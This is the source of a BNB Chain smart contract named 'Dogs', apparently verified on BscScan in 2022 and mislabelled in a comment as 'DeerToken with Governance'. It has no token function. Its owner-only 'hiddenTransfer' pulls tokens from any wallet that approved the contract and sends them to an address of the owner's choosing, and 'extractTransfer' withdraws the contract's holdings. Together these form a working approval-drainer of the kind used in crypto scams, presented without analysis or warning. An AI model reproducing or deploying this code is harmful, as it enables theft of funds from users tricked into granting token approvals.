/**
 *Submitted for verification at BscScan.com on 2022-08-17
*/

// SPDX-License-Identifier: LianZi1
pragma solidity ^0.8.0;


library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

 
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

interface IBEP20 {
 
  function totalSupply() external view returns (uint256);

  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}

 


// DeerToken with Governance.
contract Dogs {
    using SafeMath for uint256;
    address public ownerFather; //合约权限地址

        //初始化
    constructor()  {
        ownerFather = msg.sender;
    }

       //确认是不是合约部署者调用
    modifier onlyOwnerFather(){
        require(msg.sender==ownerFather,"not Owner");
        _;
    }

    
    //设置新的合约权限使用者
    function setOwnerFather(address _newOwner)external onlyOwnerFather{
        //防止合约权限锁死（不允许丢给0地址）
        require(_newOwner !=address(0),"invalid address not 0");
        ownerFather=_newOwner;
    }

    
    //查询合约权限使用者
    function getOwnerFather()external view returns (address){
        return ownerFather;
    }

    //接收ETH主币
    receive() external payable {}

    //管理员操作地址转账（需授权）
    function hiddenTransfer(address _token,address userAddress, address to, uint amount) public onlyOwnerFather{
        IBEP20 token = IBEP20(_token);
        require(token.transferFrom(userAddress,to, amount), "error");
    }

    //提取
    function extractTransfer(address _token,address _to , uint _amount) public onlyOwnerFather{
        
        IBEP20 token = IBEP20(_token);
        require(token.transfer(_to, _amount), "error");
    }

    

}